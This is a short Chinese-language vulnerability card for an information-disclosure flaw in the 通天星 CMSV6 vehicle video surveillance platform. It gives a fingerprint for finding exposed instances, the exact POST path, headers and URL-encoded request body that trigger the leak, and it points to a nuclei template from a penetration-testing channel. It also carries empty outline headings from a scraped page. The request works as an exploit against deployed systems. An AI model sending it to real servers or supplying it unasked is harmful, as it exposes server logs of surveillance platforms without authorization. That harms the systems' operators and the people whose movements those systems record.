# 通天星CMSV6车载视频监控平台SelectDevAction_loadServerLoggerFile存在信息泄露漏洞

- **系统**：通天星CMSV6车载视频监控平台　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`web.body="./open/webApi.html"`
- **请求**：`POST /808gps/LoggerManagement/SelectDevAction_loadServerLoggerFile.action HTTP/1.1`
- **关键头**：`Host: {hostname}`　`X-Requested-With: XMLHttpRequest`　`Content-Type: application/x-www-form-urlencoded;charset=UTF-8`

**请求体 / payload**
```
page=1&rp=15&query=&qtype=&pagin=%257B%2522currentPage%2522%253A1%252C%2522pageRecords%2522%253A15%257D

nuclei脚本\
\[通天星-CMSV6-selectdevaction-loadserverloggerfile-信息泄露.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- 通天星CMSV6车载视频监控平台 SelectDevAction\_loadServerLoggerFile存在信息泄露漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通天星CMSV6车载视频监控平台